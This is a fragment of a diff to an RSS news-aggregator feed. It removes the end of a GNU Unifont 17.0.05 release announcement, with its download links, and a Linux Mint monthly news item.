-&lt;br /&gt;
-
-&lt;br /&gt;
-or if that fails,
-&lt;br /&gt;
-
-&lt;br /&gt;
-     &lt;a href=&quot;https://ftp.gnu.org/gnu/unifont/unifont-17.0.05/&quot;&gt;https://ftp.gnu.o ... /unifont-17.0.05/&lt;/a&gt;
-&lt;br /&gt;
-
-&lt;br /&gt;
-or, as a last resort,
-&lt;br /&gt;
-
-&lt;br /&gt;
-     &lt;a href=&quot;ftp://ftp.gnu.org/gnu/unifont/unifont-17.0.05/&quot;&gt;ftp://ftp.gnu.org ... /unifont-17.0.05/&lt;/a&gt;
-&lt;br /&gt;
-
-&lt;br /&gt;
-These files are also available on the unifoundry.com website:
-&lt;br /&gt;
-
-&lt;br /&gt;
-     &lt;a href=&quot;https://unifoundry.com/pub/unifont/unifont-17.0.05/&quot;&gt;https://unifoundr ... /unifont-17.0.05/&lt;/a&gt;
-&lt;br /&gt;
-
-&lt;br /&gt;
-Font files are in the subdirectory
-&lt;br /&gt;
-
-&lt;br /&gt;
-     &lt;a href=&quot;https://unifoundry.com/pub/unifont/unifont-17.0.05/font-builds/&quot;&gt;https://unifoundr ... 0.05/font-builds/&lt;/a&gt;
-&lt;br /&gt;
-
-&lt;br /&gt;
-A more detailed description of font changes is available at
-&lt;br /&gt;
-
-&lt;br /&gt;
-      &lt;a href=&quot;https://unifoundry.com/unifont/index.html&quot;&gt;https://unifoundr ... nifont/index.html&lt;/a&gt;
-&lt;br /&gt;
-
-&lt;br /&gt;
-and of utility program changes at
-&lt;br /&gt;
-
-&lt;br /&gt;
-      &lt;a href=&quot;https://unifoundry.com/unifont/unifont-utilities.html&quot;&gt;https://unifoundr ... nt-utilities.html&lt;/a&gt;
-&lt;br /&gt;
-
-&lt;br /&gt;
-Information about Hangul modifications is at
-&lt;br /&gt;
-
-&lt;br /&gt;
-      &lt;a href=&quot;https://unifoundry.com/hangul/index.html&quot;&gt;https://unifoundr ... hangul/index.html&lt;/a&gt;
-&lt;br /&gt;
-
-&lt;br /&gt;
-and
-&lt;br /&gt;
-
-&lt;br /&gt;
-      &lt;a href=&quot;http://unifoundry.com/hangul/hangul-generation.html&quot;&gt;http://unifoundry ... l-generation.html&lt;/a&gt;&lt;br /&gt;
-&lt;/p&gt;</description>
-      <pubDate>Sun, 28 Jun 2026 23:20:59 -0000</pubDate>
-      <guid isPermaLink="false">https://savannah.gnu.org/news/?id=10909</guid>
-      <source url="https://planet.gnu.org/rss20.xml">Planet GNU</source>
     </item>
     <item>
       <title>[OMG! Ubuntu] This Flatpak runs a 30-year old version of GIMP – pre-GTK</title>
@@ -2629,14 +3203,6 @@ odyxz (1):
       <pubDate>Sat, 28 Feb 2015 00:00:00 -0000</pubDate>
       <guid isPermaLink="false">https://xfce.org/about/news/?post=1425081600</guid>
       <source url="https://xfce.org/feed">Xfce News</source>
-    </item>
-    <item>
-      <title>[Linux Mint Blog] Monthly News – May 2026</title>
-      <link>https://blog.linuxmint.com/?p=5025</link>
-      <description>Hi everyone, We&amp;#8217;ve got a lot of exciting news this month! But first of all, let us thank everyone involved in helping our project. Many thanks for your support and your donations! Note that the improvements and features mentioned in this blog post are planned for the next version of Linux Mint, which is scheduled [&amp;#8230;]</description>
-      <pubDate>Sat, 23 May 2026 14:32:46 -0000</pubDate>
-      <guid isPermaLink="false">https://blog.linuxmint.com/?p=5025</guid>
-      <source url="https://blog.linuxmint.com/?feed=rss2">Linux Mint Blog</source>
     </item>
     <item>
       <title>[Hyprland] v0.55.2</title>
